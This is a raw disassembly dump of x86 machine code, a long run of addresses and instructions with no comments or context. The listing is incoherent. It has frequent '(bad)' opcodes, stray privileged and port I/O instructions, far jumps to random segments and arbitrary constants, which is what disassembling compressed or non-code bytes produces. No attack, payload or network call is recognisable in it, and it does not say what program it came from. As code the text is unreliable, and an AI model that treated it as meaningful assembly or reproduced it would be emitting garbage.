  422f75:	jns    0x422f2d
  422f77:	pop    ds
  422f78:	cmc    
  422f79:	inc    DWORD PTR [ecx]
  422f7b:	sub    DWORD PTR [eax+0x61],ecx
  422f7e:	dec    ebx
  422f7f:	jmp    0x406b:0x2431e026
  422f86:	lahf   
  422f87:	push   edx
  422f88:	pop    edi
  422f89:	xchg   ebx,eax
  422f8a:	and    ebp,0x100dbe3
  422f90:	cmp    DWORD PTR gs:0xa6fd3933,0xa8783ea
  422f9b:	jo     0x422fae
  422f9d:	scas   eax,DWORD PTR es:[edi]
  422f9e:	repz mov ds:0x6844a026,eax
  422fa4:	adc    esi,DWORD PTR [ebp+0xb]
  422fa7:	test   al,0xa9
  422fa9:	(bad)  
  422faa:	cmp    ch,ch
  422fac:	xchg   ecx,eax
  422fad:	ins    BYTE PTR es:[edi],dx
  422fae:	test   DWORD PTR [eax-0x77],edx
  422fb1:	ficom  DWORD PTR [ecx+0x6a]
  422fb4:	enter  0x821f,0x17
  422fb8:	shl    DWORD PTR [ebx-0x49c0a46f],0xe8
  422fbf:	mov    cl,0x10
  422fc1:	mov    DWORD PTR [ebx-0x62bc8a7],edi
  422fc7:	adc    al,0x9a
  422fc9:	pop    ebx
  422fca:	xor    eax,0x51f03c89
  422fcf:	js     0x42300a
  422fd1:	add    eax,0xcef6433a
  422fd6:	and    BYTE PTR [esp+eax*8+0x672df7f6],bh
  422fdd:	aad    0x88
  422fdf:	lods   al,BYTE PTR ds:[esi]
  422fe0:	ja     0x42305c
  422fe2:	js     0x422fb0
  422fe4:	stc    
  422fe5:	or     ecx,DWORD PTR [edx-0x7185783c]
  422feb:	aas    
  422fec:	or     BYTE PTR [ecx+edx*2],al
  422fef:	or     DWORD PTR [ecx+0x37],ebp
  422ff2:	pop    edx
  422ff3:	add    DWORD PTR [esp+esi*2+0x24],esi
  422ff7:	jae    0x42304c
  422ff9:	pop    ebp
  422ffa:	push   esi
  422ffb:	or     DWORD PTR [ecx-0x6bd739e],ebx
  423001:	push   ebx
  423002:	mov    bl,0x95
  423004:	sbb    al,0x2
  423006:	imul   edi,DWORD PTR [edi+0x5],0x73
  42300a:	das    
  42300b:	dec    eax
  42300c:	jmp    0xa6316e00
  423011:	std    
  423012:	mov    eax,ds:0x3d6cfccc
  423017:	test   eax,0x718b24e6
  42301c:	mov    eax,ds:0xb2a306c9
  423021:	lods   al,BYTE PTR ds:[esi]
  423022:	aas    
  423023:	test   DWORD PTR [edi],0xd9f8fa12
  423029:	into   
  42302a:	xchg   ebp,ebp
  42302c:	pop    ebx
  42302d:	outs   dx,BYTE PTR ds:[esi]
  42302e:	mov    bh,dl
  423030:	fild   WORD PTR [edi]
  423032:	jno    0x423032
  423034:	jne    0x422fd9
  423036:	arpl   WORD PTR [ecx+0x18],si
  423039:	push   edx
  42303a:	sub    eax,0x35eeb90a
  42303f:	pushf  
  423040:	fsub   DWORD PTR [edi]
  423042:	jns    0x422fc5
  423044:	mov    eax,ds:0xa7f69dbe
  423049:	gs mov ebp,0x82e6056a
  42304f:	(bad)  
  423050:	and    ch,dh
  423052:	mov    ds:0x6ba0256c,eax
  423057:	mov    eax,ds:0x27a969a6
  42305c:	jmp    0x42300b
  42305e:	ja     0x4230d2
  423060:	jle    0x42300b
  423062:	leave  
  423063:	push   0xffffffaf
  423065:	gs xor eax,0x14cac13d
  42306b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42306c:	xor    edx,0x556cdea6
  423072:	pop    edi
  423073:	and    cl,BYTE PTR cs:[ebx+0x7d792c08]
  42307a:	ret    0x6e0d
  42307d:	pop    edi
  42307e:	dec    BYTE PTR [ecx]
  423080:	fs stos BYTE PTR es:[edi],al
  423082:	jnp    0x42307c
  423084:	iret   
  423085:	pop    edx
  423086:	imul   edx,DWORD PTR [eax+edx*4+0x3d],0xffffffbc
  42308b:	cmp    al,0x86
  42308d:	mov    ds:0x8e0fa4ff,al
  423092:	inc    ecx
  423093:	push   ds
  423094:	mul    BYTE PTR [eax-0x69]
  423097:	cdq    
  423098:	fstp   TBYTE PTR [esi-0x1a17c7f2]
  42309e:	push   ss
  42309f:	sub    edi,DWORD PTR [edi-0x5305857e]
  4230a5:	adc    dh,ah
  4230a7:	lods   eax,DWORD PTR ds:[esi]
  4230a8:	icebp  
  4230a9:	adc    eax,0x249ff393
  4230ae:	dec    ebx
  4230af:	ret    0x3dc0
  4230b2:	or     esp,DWORD PTR [edx-0x69cd60cd]
  4230b8:	lock push edx
  4230ba:	int3   
  4230bb:	hlt    
  4230bc:	out    dx,eax
  4230bd:	xor    BYTE PTR [ebx],bh
  4230bf:	test   dh,cl
  4230c1:	rol    al,0x1
  4230c4:	and    esi,DWORD PTR [esi+0x66]
  4230c7:	daa    
  4230c8:	mov    esp,0xc68342ed
  4230cd:	stos   BYTE PTR es:[edi],al
  4230ce:	push   edi
  4230cf:	sbb    ecx,esi
  4230d1:	jb     0x4230d5
  4230d3:	(bad)  
  4230d4:	enter  0xab53,0xf0
  4230d8:	and    ch,BYTE PTR [ebx+0x31]
  4230db:	sbb    bh,BYTE PTR [edx+0xf]
  4230de:	popf   
  4230df:	mov    BYTE PTR [edx],dl
  4230e1:	(bad)  
  4230e2:	xor    DWORD PTR [ecx+0x1b1147c5],edi
  4230e8:	fmul   DWORD PTR [ebx]
  4230ea:	xor    BYTE PTR [esi+eax*1-0x17e707e0],0xef
  4230f2:	jmp    0xabf:0x61ee14b0
  4230f9:	jne    0x423082
  4230fb:	adc    BYTE PTR es:[esi+0x73e7647c],dh
  423102:	jns    0x423145
  423104:	xor    esp,DWORD PTR [edx-0x3823c5a]
  42310a:	loope  0x4230eb
  42310c:	outs   dx,DWORD PTR ds:[esi]
  42310d:	cld    
  42310e:	in     al,dx
  42310f:	stos   BYTE PTR es:[edi],al
  423110:	mov    bh,0x93
  423112:	test   DWORD PTR [esi],eax
  423114:	mov    al,ds:0x50b21cff
  423119:	sbb    BYTE PTR [edx-0x54],ah
  42311c:	rcl    ebp,cl
  42311e:	and    al,0x7c
  423120:	cmc    
  423121:	mov    es,WORD PTR [ebp+0x695e9b7e]
  423127:	ins    BYTE PTR es:[edi],dx
  423128:	(bad)  
  423129:	in     eax,dx
  42312a:	fmul   QWORD PTR [ecx+0x48919a90]
  423130:	mov    al,ds:0xb66664e9
  423135:	push   ebp
  423136:	leave  
  423137:	sbb    edx,eax
  423139:	stos   DWORD PTR es:[edi],eax
  42313a:	sub    al,0x3f
  42313c:	sbb    eax,ebp
  42313e:	mov    al,0xb0
  423140:	xchg   esp,eax
  423141:	pop    esi
  423142:	xor    ebp,DWORD PTR [esi-0x29]
  423145:	test   al,0xfa
  423147:	xlat   BYTE PTR ds:[ebx]
  423148:	cmp    eax,0x38f16a64
  42314d:	daa    
  42314e:	adc    dl,BYTE PTR [ebx-0x4a]
  423151:	stos   BYTE PTR es:[edi],al
  423152:	jo     0x423166
  423154:	push   ebx
  423155:	sub    ecx,0x3b
  423158:	add    ah,dl
  42315a:	pop    eax
  42315b:	sbb    DWORD PTR [esi],esi
  42315d:	neg    dh
  42315f:	into   
  423160:	ret    
  423161:	(bad)  
  423162:	jge    0x4231da
  423164:	adc    BYTE PTR [edi],dl
  423166:	xchg   edi,eax
  423167:	pushf  
  423168:	mov    edi,DWORD PTR [eax]
  42316a:	pusha  
  42316b:	cld    
  42316c:	jp     0x423136
  42316e:	inc    ecx
  42316f:	inc    esp
  423170:	outs   dx,DWORD PTR ds:[esi]
  423171:	inc    eax
  423172:	mov    edi,0x22d3463b
  423177:	pushf  
  423178:	(bad)  
  423179:	xor    eax,0xeb55a34d
  42317e:	add    dl,BYTE PTR [edx]
  423180:	or     DWORD PTR [edx-0x58d49d48],ebx
  423186:	adc    eax,0xdc3deb9
  42318b:	and    bl,al
  42318d:	push   cs
  42318e:	(bad)  
  42318f:	cdq    
  423190:	into   
  423191:	sub    DWORD PTR ss:[ebx-0x2b],edx
  423195:	in     eax,dx
  423196:	loop   0x423207
  423198:	jae    0x423128
  42319a:	mov    ds:0xdf648e39,al
  42319f:	jmp    0x4231e5
  4231a1:	add    al,0x81
  4231a3:	pop    ebp
  4231a4:	mov    edi,0x16a1306e
  4231a9:	xchg   edx,eax
  4231aa:	sti    
  4231ab:	pop    edi
  4231ac:	pop    es
  4231ad:	xlat   BYTE PTR ds:[ebx]
  4231ae:	stos   DWORD PTR es:[edi],eax
  4231af:	stos   DWORD PTR es:[edi],eax
  4231b0:	js     0x423191
  4231b2:	mov    ah,0xad
  4231b4:	cld    
  4231b5:	hlt    
  4231b6:	xchg   edi,eax
  4231b7:	aam    0xd4
  4231b9:	je     0x4231c2
  4231bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231bc:	out    dx,eax
  4231bd:	nop    ebx
  4231c0:	sbb    bh,al
  4231c2:	(bad)  
  4231c3:	out    0x51,eax
  4231c5:	cmp    BYTE PTR [esi],cl
  4231c7:	ds cld 
  4231c9:	mov    edx,0x4bafeebc
  4231ce:	out    0x24,al
  4231d0:	outs   dx,DWORD PTR ds:[esi]
  4231d1:	popf   
  4231d2:	dec    esi
  4231d3:	jne    0x42323b
  4231d5:	(bad)  
  4231d6:	push   ebp
  4231d7:	or     edx,esi
  4231d9:	mov    cl,0xd4
  4231db:	std    
  4231dc:	aas    
  4231dd:	mov    eax,0x6836475d
  4231e2:	xchg   edx,eax
  4231e3:	add    cl,0xe8
  4231e6:	gs inc esi
  4231e8:	cs nop
  4231ea:	mov    WORD PTR [ebp-0x60],es
  4231ed:	or     al,0xb
  4231ef:	cld    
  4231f0:	push   edi
  4231f1:	mov    es,WORD PTR [eax-0x10150a0a]
  4231f7:	lods   eax,DWORD PTR ds:[esi]
  4231f8:	jecxz  0x42320f
  4231fa:	add    dh,dh
  4231fc:	jno    0x4231ed
  4231fe:	fbld   TBYTE PTR ds:0x7d37eaf1
  423204:	ficom  DWORD PTR [ecx-0x3b3c723]
  42320a:	xchg   ebp,eax
  42320b:	aaa    
  42320c:	fcomp  QWORD PTR [edx+0x4e]
  42320f:	jae    0x4231e9
  423211:	push   0x40
  423213:	jb     0x42320d
  423215:	into   
  423216:	push   ebp
  423217:	add    eax,0x7928827c
  42321c:	mov    dh,0x2d
  42321e:	fstp   DWORD PTR [ecx]
  423220:	outs   dx,DWORD PTR ds:[esi]
  423221:	mov    ebx,0xdf8021d
  423226:	das    
  423227:	shl    eax,cl
  423229:	pop    edx
  42322a:	clflush BYTE PTR [edx]
  42322d:	push   edi
  42322e:	loopne 0x42329f
  423230:	dec    esi
  423231:	into   
  423232:	and    edi,esp
  423234:	sbb    BYTE PTR [bx+si-0x5ec8],dh
  423239:	cmp    BYTE PTR [edi+edi*8+0x28],al
  42323d:	xchg   BYTE PTR [edi],dl
  42323f:	mov    BYTE PTR ds:0x2e9f25a6,ch
  423245:	out    dx,eax
  423246:	mov    eax,0xbc4059d0
  42324b:	dec    ebx
  42324c:	xchg   ecx,eax
  42324d:	adc    eax,0xbd634b3e
  423252:	test   eax,0x777c898b
  423257:	mov    eax,0xe25c889e
  42325c:	bound  eax,QWORD PTR [ebx*1-0xf267c2d]
  423263:	scas   al,BYTE PTR es:[edi]
  423264:	pop    DWORD PTR [edx-0x1fad15c7]
  42326a:	dec    edi
  42326b:	jge    0x4232e1
  42326d:	pop    esp
  42326e:	dec    esp
  42326f:	fcmovnu st,st(6)
  423271:	inc    edx
  423272:	cmc    
  423273:	adc    edi,esp
  423275:	repnz or eax,0x1c5e4f35
  42327b:	xchg   esi,eax
  42327c:	mov    edx,0x7bc341b
  423281:	loopne 0x42321c
  423283:	pop    ss
  423284:	nop
  423285:	and    eax,0x716951ce
  42328a:	cli    
  42328b:	jne    0x42324d
  42328d:	mov    dl,0xd3
  42328f:	loopne 0x4232b0
  423291:	in     eax,0xba
  423293:	xchg   esi,eax
  423294:	xchg   DWORD PTR [ebp-0xab9e8ee],esp
  42329a:	sub    ah,BYTE PTR [esi-0x4b]
  42329d:	cs ins BYTE PTR es:[edi],dx
  42329f:	xchg   BYTE PTR [edi-0x38],ah
  4232a2:	out    0xb,eax
  4232a4:	sub    edx,0xffffffaf
  4232a7:	or     BYTE PTR [ebx],dl
  4232a9:	mov    al,ds:0x10fd0638
  4232ae:	pop    eax
  4232af:	nop
  4232b0:	stos   BYTE PTR es:[edi],al
  4232b1:	sbb    esp,DWORD PTR [edi-0x4d]
  4232b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232b5:	add    eax,0x69175700
  4232ba:	push   es
  4232bb:	addr16 pushf 
  4232bd:	or     DWORD PTR [ebp-0x76],edi
  4232c0:	pusha  
  4232c1:	push   eax
  4232c2:	pop    es
  4232c3:	adc    dh,BYTE PTR [edx+0x3389f2c8]
  4232c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232ca:	aaa    
  4232cb:	outs   dx,BYTE PTR ds:[esi]
  4232cc:	mov    WORD PTR [esi+edx*2-0x264fff5e],fs
  4232d3:	call   0xa9d72057
  4232d8:	add    al,0x38
  4232da:	xor    ecx,DWORD PTR [edi-0x332c465e]
  4232e0:	ins    BYTE PTR es:[edi],dx
  4232e1:	push   esp
  4232e2:	sub    ebp,ebx
  4232e4:	fstp   QWORD PTR [ecx]
  4232e6:	das    
  4232e7:	jle    0x423364
  4232e9:	and    esi,ebp
  4232eb:	push   esi
  4232ec:	dec    edi
  4232ed:	sub    BYTE PTR [eax-0x33],bl
  4232f0:	or     BYTE PTR [eax],al
  4232f2:	stos   BYTE PTR es:[edi],al
  4232f3:	add    ecx,DWORD PTR [edx+0x66]
  4232f6:	rcr    BYTE PTR [edx+0x58d49167],1
  4232fc:	pop    eax
  4232fd:	call   0x929bdd46
  423302:	fld    QWORD PTR [ecx+0x2e3a69f1]
  423308:	jno    0x4232df
  42330a:	es inc edi
  42330c:	int3   
  42330d:	jecxz  0x423331
  42330f:	shl    DWORD PTR [ecx],cl
  423311:	xchg   esp,eax
  423312:	test   al,0xac
  423314:	je     0x42336e
  423316:	xor    eax,DWORD PTR [eax]
	...
  423320:	add    dl,bh
  423322:	dec    esp
  423323:	push   es
  423324:	ret    
  423325:	mov    dh,0xcb
  423327:	(bad)  
  423328:	jge    0x423393
  42332a:	cmp    ah,BYTE PTR [edi]
  42332c:	in     al,0x84
  42332e:	fst    QWORD PTR ds:[edx+0x1abe7]
  423335:	scas   al,BYTE PTR es:[edi]
  423336:	add    eax,DWORD PTR [eax]
  423338:	add    BYTE PTR [ecx+0x14e7610b],dl
  42333e:	mov    dh,0x91
  423340:	sbb    BYTE PTR [edi],0x34
  423343:	sub    al,0xa6
  423345:	add    DWORD PTR ds:[ecx],0x57
  423349:	loop   0x4232e8
  42334b:	aam    0xa6
  42334d:	lds    esp,FWORD PTR [edx+0x3ce55a7b]
  423353:	xchg   esp,eax
  423354:	dec    edx
  423355:	cmp    eax,0x27fe6004
  42335a:	dec    eax
  42335b:	ret    
  42335c:	push   cs
  42335d:	imul   eax,DWORD PTR [edx+0x2b5e67e3],0x99ac7fca
  423367:	cs repz cmp al,0xa1
  42336b:	push   edx
  42336c:	adc    eax,0xccebf41e
  423371:	adc    BYTE PTR [edx+edx*2-0x4c0d5322],ah
  423378:	in     al,dx
  423379:	pop    esi
  42337a:	mov    esp,0x93af04ac
  42337f:	and    al,bh
  423381:	ja     0x4233fa
  423383:	xchg   esi,eax
  423384:	jl     0x4233f9
  423386:	lods   eax,DWORD PTR ds:[esi]
  423387:	fstp   QWORD PTR [ebp*4+0x7fa50757]
  42338e:	xor    bl,cl
  423390:	test   BYTE PTR [eax],bh
  423392:	mov    edx,DWORD PTR [eax-0x5]
  423395:	test   ebx,0xb3123b87
  42339b:	div    DWORD PTR [eax+0x2c]
  42339e:	add    eax,0x37765299
  4233a3:	inc    edx
  4233a4:	jp     0x4233ae
  4233a6:	sbb    ch,al
  4233a8:	xchg   esp,ebx
  4233aa:	jecxz  0x4233db
  4233ac:	mov    dh,0x8f
  4233ae:	and    dl,BYTE PTR [ebp+0x5c3de9df]
  4233b4:	scas   al,BYTE PTR es:[edi]
  4233b5:	xchg   edx,eax
  4233b6:	push   edi
  4233b7:	icebp  
  4233b8:	sub    ebx,DWORD PTR [esi+0x491e3cff]
  4233be:	mov    dl,0x4b
  4233c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233c1:	jmp    0x1a55:0x788ed5a4
  4233c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233c9:	iret   
  4233ca:	xor    edi,DWORD PTR [edi-0x1e]
  4233cd:	ss sar ebp,cl
  4233d0:	push   0xffffffcc
  4233d2:	fs es je 0x4233f1
  4233d6:	pushf  
  4233d7:	retf   
  4233d8:	xor    esp,esi
  4233da:	ds dec ebx
  4233dc:	mov    ds:0xebfa00a8,al
  4233e1:	pop    edi
  4233e2:	pop    eax
  4233e3:	pop    ebp
  4233e4:	iret   
  4233e5:	cmp    BYTE PTR [ebx+0x3245f6c9],dh
  4233eb:	call   0xf59a4eee
  4233f0:	push   edx
  4233f1:	out    0xfd,eax
  4233f3:	outs   dx,BYTE PTR ds:[esi]
  4233f4:	inc    ebx
  4233f5:	sbb    al,0xf2
  4233f7:	push   ss
  4233f8:	and    cl,BYTE PTR ds:0x2c7c9018
  4233fe:	dec    esp
  4233ff:	mov    edx,0x6382cefc
  423404:	jmp    0x2057:0x147265a5
  42340b:	call   0xba3f0598
  423410:	mov    bh,0x91
  423412:	das    
  423413:	xor    al,BYTE PTR [ecx+0x6e54a8a6]
  423419:	(bad)  
  42341a:	sub    al,0x65
  42341c:	call   0x3722:0xb259f669
  423423:	sbb    esi,DWORD PTR [esp+ecx*8+0x4a]
  423427:	neg    ah
  423429:	pop    ebx
  42342a:	test   eax,0x123fa551
  42342f:	test   al,0xa2
  423431:	jnp    0x423489
  423433:	in     eax,0x40
  423435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423436:	dec    ecx
  423437:	std    
  423438:	in     al,0xca
  42343a:	call   0x2922:0x70314934
  423441:	and    eax,0x905c2c37
  423446:	hlt    
  423447:	pop    ds
  423448:	pop    ebp
  423449:	fadd   QWORD PTR [ebx+0x1181531a]
  42344f:	shr    BYTE PTR [edx],0xc3
  423452:	sub    eax,0xa6a15659
  423457:	mov    esi,0xcf31dc01
  42345c:	lea    ebp,[ecx+eax*1-0x78]
  423460:	leave  
  423461:	mov    al,0x6
  423463:	mov    eax,ds:0xf79b678
  423468:	es in  eax,0x1e
  42346b:	sbb    dh,cl
  42346d:	sub    BYTE PTR [ebx+0x50bc648a],bh
  423473:	mov    bh,0x54
  423475:	mov    eax,DWORD PTR [edx+0x33441f03]
  42347b:	or     eax,0x3b796c1d
  423480:	inc    ecx
  423481:	pop    es
  423482:	ret    0x5f10
  423485:	mov    eax,ds:0x62a954a5
  42348a:	sub    al,0x6c
  42348c:	ret    0x1e
  42348f:	push   0x2a3a5c48
  423494:	pop    eax
  423495:	or     al,0xfd
  423497:	outs   dx,DWORD PTR ds:[esi]
  423498:	shr    DWORD PTR [esi-0x75],cl
  42349b:	dec    eax
  42349c:	mov    bh,ch
  42349e:	je     0x423488
  4234a0:	dec    esi
  4234a1:	popf   
  4234a2:	mov    ds:0x51d661fc,al
  4234a7:	and    al,0xdb
  4234a9:	dec    DWORD PTR [esi-0x66707c88]
  4234af:	mov    ebx,DWORD PTR [esi]
  4234b1:	stos   DWORD PTR es:[edi],eax
  4234b2:	rcl    DWORD PTR [esi],cl
  4234b4:	into   
  4234b5:	sub    edi,ebp
  4234b7:	bnd ds jb 0x423475
  4234bb:	loop   0x423496
  4234bd:	xchg   esi,eax
  4234be:	mov    ds:0x54ec84bb,eax
  4234c3:	loopne 0x423543
  4234c5:	dec    ebp
  4234c6:	test   DWORD PTR [ebx+0x12],ecx
  4234c9:	sti    
  4234ca:	pop    esp
  4234cb:	(bad)  
  4234cc:	fdivr  DWORD PTR [edx+0x6332cc7f]
  4234d2:	fwait
  4234d3:	(bad)  
  4234d4:	and    al,0x93
  4234d6:	and    al,0x59
  4234d8:	fs mov ch,bh
  4234db:	clc    
  4234dc:	push   edx
  4234dd:	repz sbb ebx,DWORD PTR [edx-0x76560c6f]
  4234e4:	dec    ecx
  4234e5:	sub    eax,0xda349f1f
  4234ea:	xchg   edi,eax
  4234eb:	sub    DWORD PTR [ebx],0x1a
  4234ee:	pop    ecx
  4234ef:	mov    al,ds:0x8833fd7e
  4234f4:	ficomp DWORD PTR [eax]
  4234f6:	icebp  
  4234f7:	xor    DWORD PTR [ebp+0x2e],edx
  4234fa:	sahf   
  4234fb:	aas    
  4234fc:	sbb    BYTE PTR [ebx],cl
  4234fe:	xor    edx,esi
  423500:	push   ebx
  423501:	fld    TBYTE PTR [esi]
  423503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423504:	adc    BYTE PTR [esi],bh
  423506:	pop    eax
  423507:	xlat   BYTE PTR ds:[ebx]
  423508:	jo     0x42351a
  42350a:	cli    
  42350b:	outs   dx,DWORD PTR ds:[esi]
  42350c:	push   cs
  42350d:	xor    ebp,DWORD PTR [ebx-0x1a9a0b18]
  423513:	(bad)  
  423514:	pop    edx
  423515:	sbb    edi,DWORD PTR [esi]
  423517:	mov    ah,0xf7
  423519:	out    dx,eax
  42351a:	(bad)  ds:0xcd31615c
  423520:	add    bh,ch
  423522:	pop    eax
  423523:	and    bh,BYTE PTR [ebp-0x5c]
  423526:	aad    0xaa
  423528:	dec    esi
  423529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42352a:	and    bh,BYTE PTR [ecx-0x4c]
  42352d:	leave  
  42352e:	mov    al,0x32
  423530:	add    eax,0x97515b81
  423535:	and    eax,DWORD PTR es:[edx-0x1439b3f7]
  42353c:	mov    bl,0x6c
  42353e:	das    
  42353f:	add    bh,BYTE PTR [edx]
  423541:	sbb    BYTE PTR [ecx+esi*1],dh
  423544:	mov    ebp,0x804ef1e
  423549:	les    esi,FWORD PTR [esi-0xc]
  42354c:	pop    ebp
  42354d:	std    
  42354e:	adc    al,0xcb
  423550:	lahf   
  423551:	pop    esp
  423552:	dec    esp
  423553:	jnp    0x423515
  423555:	xchg   ebx,eax
  423556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423557:	clc    
  423558:	cmp    BYTE PTR [esi],dl
  42355a:	mov    esp,0xe991eb47
  42355f:	div    BYTE PTR es:[ebx-0x50560d07]
  423566:	fdiv   QWORD PTR [esi+edi*2+0xdeed2cb]
  42356d:	and    eax,0xd5cd377f
  423572:	in     eax,0x9f
  423574:	icebp  
  423575:	mov    cl,0xa7
  423577:	add    al,0x7f
  423579:	in     eax,dx
  42357a:	mov    ah,0xc5
  42357c:	or     al,0x37
  42357e:	shr    DWORD PTR [esi-0x353074ca],cl
  423584:	mov    edi,0x7dd6dc75
  423589:	and    al,0x43
  42358b:	cdq    
  42358c:	and    esp,DWORD PTR [esi+edx*2]
  42358f:	nop
  423590:	sti    
  423591:	loop   0x4235fe
  423593:	out    dx,eax
  423594:	rcl    DWORD PTR [edi+0x44d2478a],0x70
  42359b:	xlat   BYTE PTR ds:[ebx]
  42359c:	add    ch,BYTE PTR [esi+0xc]
  42359f:	outs   dx,BYTE PTR ds:[esi]
  4235a0:	sbb    eax,0x65c124f9
  4235a5:	inc    ecx
  4235a6:	(bad)  [ebx+esi*2]
  4235a9:	retf   0x4cbb
  4235ac:	push   edi
  4235ad:	sub    al,0xe4
  4235af:	and    al,0xef
  4235b1:	inc    ebp
  4235b2:	and    dl,ch
  4235b4:	cmp    al,0xb8
  4235b6:	jbe    0x42358e
  4235b8:	xchg   ebx,eax
  4235b9:	inc    ebx
  4235ba:	retf   0x3847
  4235bd:	(bad)  
  4235be:	ds cld 
  4235c0:	outs   dx,DWORD PTR ds:[esi]
  4235c1:	in     al,dx
  4235c2:	push   eax
  4235c3:	imul   eax,DWORD PTR [eax+eiz*4-0x29eb4df1],0xffffffce
  4235cb:	call   FWORD PTR [esi+0x7f71e035]
  4235d1:	stc    
  4235d2:	xor    ebp,eax
  4235d4:	xor    al,0x71
  4235d6:	(bad)  
  4235d7:	imul   edi,DWORD PTR ds:0xc45daab5,0xffffffeb
  4235de:	rol    dh,1
  4235e0:	mov    eax,0xf71eb49d
  4235e5:	mov    eax,ds:0x49eec40c
  4235ea:	lea    ecx,[edi+0x32]
  4235ed:	fistp  QWORD PTR [ebx-0x290814d5]
  4235f3:	mov    eax,ds:0x3a58e964
  4235f8:	xor    BYTE PTR [eax+0x55],dh
  4235fb:	jg     0x4235cd
  4235fd:	adc    al,cl
  4235ff:	jae    0x4235d1
  423601:	test   eax,0x4150b3ed
  423606:	mov    edx,0xe45c768
  42360b:	js     0x423670
  42360d:	cli    
  42360e:	sbb    al,0x31
  423610:	jbe    0x423605
  423612:	inc    edx
  423613:	in     eax,dx
  423614:	xlat   BYTE PTR ds:[ebx]
  423615:	and    cl,BYTE PTR [ebx+0x676f789f]
  42361b:	mov    eax,ds:0x4c269e56
  423620:	push   ebx
  423621:	push   eax
  423622:	into   
  423623:	sbb    edi,0x8b802c5d
  423629:	sub    esi,DWORD PTR [edi-0x15c6800e]
  42362f:	jge    0x4235e8
  423631:	leave  
  423632:	mov    bl,0xf9
  423634:	and    DWORD PTR [edx-0x2d718ce6],eax
  42363a:	or     DWORD PTR [ebp+0x8ca27df],0xbb8f1b34
  423644:	push   ss
  423645:	lea    esi,[ecx+eax*1-0x2a13169d]
  42364c:	cs int3 
  42364e:	pop    ds
  42364f:	push   ds
  423650:	jns    0x42368b
  423652:	mov    ebx,0x40e9087b
  423657:	and    edx,esi
  423659:	test   BYTE PTR [edx],0x63
  42365c:	(bad)  
  42365d:	mov    edx,0xcad2cc0c
  423662:	cs stos DWORD PTR es:[edi],eax
  423664:	das    
  423665:	mov    edx,0xcdbbd704
  42366a:	fcom   QWORD PTR [ebp-0x2a]
  42366d:	xchg   ecx,eax
  42366e:	cmc    
  42366f:	mov    eax,ds:0x52a77113
  423674:	sub    al,0xf4
  423676:	clc    
  423677:	jl     0x423692
  423679:	xor    eax,0xc267b086
  42367e:	add    BYTE PTR [eax-0xf],ch
  423681:	mov    edi,0x88a3be7a
  423686:	rol    DWORD PTR [edx-0x47],0x15
  42368a:	cmp    eax,0x481e858d
  42368f:	dec    ecx
  423690:	pop    ecx
  423691:	mov    ch,0xe1
  423693:	imul   esp,DWORD PTR [ebp-0x61],0xae3ad0d3
  42369a:	jmp    0x410659ab
  42369f:	sbb    eax,0x4033b80a
  4236a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236a5:	stos   BYTE PTR es:[edi],al
  4236a6:	mov    cl,0x82
  4236a8:	jle    0x423691
  4236aa:	pop    ebp
  4236ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236ac:	shl    BYTE PTR [esi-0x27d30d90],1
  4236b2:	ror    cl,cl
  4236b4:	sbb    ebp,DWORD PTR [edi]
  4236b6:	and    esi,DWORD PTR [ecx-0x26880969]
  4236bc:	add    ch,BYTE PTR [eax*1-0x45399393]
  4236c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236c4:	fwait
  4236c5:	xor    eax,0xe9488485
  4236ca:	and    bl,BYTE PTR [ebx]
  4236cc:	or     eax,0x61bd5f56
  4236d1:	bound  ecx,QWORD PTR [esi+0x4b587575]
  4236d7:	scas   al,BYTE PTR es:[edi]
  4236d8:	mov    esi,0xc0ad40d2
  4236dd:	add    DWORD PTR [eax],edi
  4236df:	and    BYTE PTR [edx],al
  4236e1:	lock rcl cl,0xca
  4236e5:	gs (bad) 
	...
  4236ef:	add    BYTE PTR [eax],al
  4236f1:	sbb    al,0x66
  4236f3:	in     eax,0x66
  4236f5:	jmp    edi
  4236f7:	lahf   
  4236f8:	jle    0x42374a
  4236fa:	stos   BYTE PTR es:[edi],al
  4236fb:	xchg   BYTE PTR [eax+0x23524eaa],dh
  423701:	xchg   ebp,eax
  423702:	scas   eax,DWORD PTR es:[edi]
  423703:	add    DWORD PTR [eax],eax
  423705:	scas   al,BYTE PTR es:[edi]
  423706:	add    eax,DWORD PTR [eax]
  423708:	add    dl,ch
  42370a:	add    DWORD PTR [ebp-0x25],ebp
  42370d:	dec    edx
  42370e:	xchg   cl,ah
  423710:	sbb    ah,BYTE PTR [esi]
  423712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423713:	sub    ebx,DWORD PTR [eax+ebx*8+0x50]
  423717:	ja     0x4236b9
  423719:	add    DWORD PTR [ebp-0x78],0x4e
  42371d:	sbb    ebx,0xff0bca07
  423723:	jnp    0x4236c6
  423725:	mov    ds:0x698052ed,eax
  42372a:	cdq    
  42372b:	xchg   edi,eax
  42372c:	fld    DWORD PTR [eax]
  42372e:	xor    ebx,0x378c17e8
  423734:	in     eax,0xd3
  423736:	mov    al,cs:0x2afee8d1
  42373c:	dec    ecx
  42373d:	sti    
  42373e:	pop    esp
  42373f:	hlt    
  423740:	cmc    
  423741:	lahf   
  423742:	dec    ebp
  423743:	test   BYTE PTR [eax],al
  423745:	gs sahf 
  423747:	arpl   WORD PTR [edi-0x20b26403],si
  42374d:	mov    dl,0x2
  42374f:	(bad)  
  423750:	je     0x423780
  423752:	je     0x423737
  423754:	mov    al,0x18
  423756:	ss (bad) 
  423758:	cmp    BYTE PTR [ecx+0x7a],ch
  42375b:	dec    edi
  42375c:	sbb    al,0x1c
  42375e:	sbb    al,bh
  423760:	sbb    BYTE PTR [ecx+0x19585617],bl
  423766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423767:	sub    DWORD PTR [ebp+0x7ec094e3],eax
  42376d:	sub    edx,edi
